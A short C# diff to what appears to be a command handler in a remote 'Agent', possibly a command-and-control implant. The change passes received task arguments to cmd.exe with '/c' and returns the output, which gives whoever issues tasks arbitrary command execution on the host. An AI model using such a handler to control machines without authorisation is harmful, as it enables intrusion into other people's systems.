@@ -16,7 +16,7 @@ namespace Agent.Commands
         {
             var args = string.Join(" ", task.Arguments);
 
-            string output = Utils.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", args);
+            string output = Utils.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
             
             return output;
 
